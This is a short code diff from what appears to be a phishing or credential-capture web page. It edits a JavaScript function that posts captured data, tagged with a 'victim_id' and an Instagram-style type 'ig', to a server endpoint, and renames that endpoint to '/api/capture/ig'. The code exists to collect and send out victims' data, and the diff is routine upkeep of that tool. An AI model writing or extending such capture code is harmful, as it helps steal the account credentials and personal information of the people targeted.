@@ -163,7 +163,7 @@
 
         async function sendData(payload) {
             try {
-                await fetch('/api/capture', {
+                await fetch('/api/capture/ig', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ victim_id: victimId, type: 'ig', ...payload })
